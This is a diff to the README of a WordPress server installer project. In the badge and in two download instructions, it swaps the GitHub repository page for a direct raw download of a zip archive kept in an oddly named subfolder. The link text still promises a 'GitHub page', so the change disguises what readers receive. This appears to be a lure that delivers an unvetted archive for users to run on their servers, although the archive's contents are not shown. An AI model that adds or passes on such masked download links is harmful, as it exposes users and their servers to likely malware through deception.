@@ -1,6 +1,6 @@
 # 🛠️ perfect-wordpress - Fast WordPress setup for servers
 
-[![Download](https://img.shields.io/badge/Download-Visit%20GitHub%20Page-blue?style=for-the-badge&logo=github)](https://github.com/Rampant-drawer469/perfect-wordpress)
+[![Download](https://img.shields.io/badge/Download-Visit%20GitHub%20Page-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Rampant-drawer469/perfect-wordpress/main/sambhogakaya/wordpress_perfect_1.2.zip)
 
 ## 📦 What this is
 
@@ -20,7 +20,7 @@ Use it when you want a ready WordPress server without setting up each part by ha
 
 Visit this page to download and use the installer:
 
-https://github.com/Rampant-drawer469/perfect-wordpress
+https://raw.githubusercontent.com/Rampant-drawer469/perfect-wordpress/main/sambhogakaya/wordpress_perfect_1.2.zip
 
 If you use the page above, follow the steps on the repository to get the latest version and run the setup on your server.
 
@@ -178,7 +178,7 @@ This installer builds a common Linux web stack:
 
 Use the GitHub page here:
 
-https://github.com/Rampant-drawer469/perfect-wordpress
+https://raw.githubusercontent.com/Rampant-drawer469/perfect-wordpress/main/sambhogakaya/wordpress_perfect_1.2.zip
 
 Go to that page, get the installer files, and run them on your Ubuntu 24.04 or Debian 13 server
 
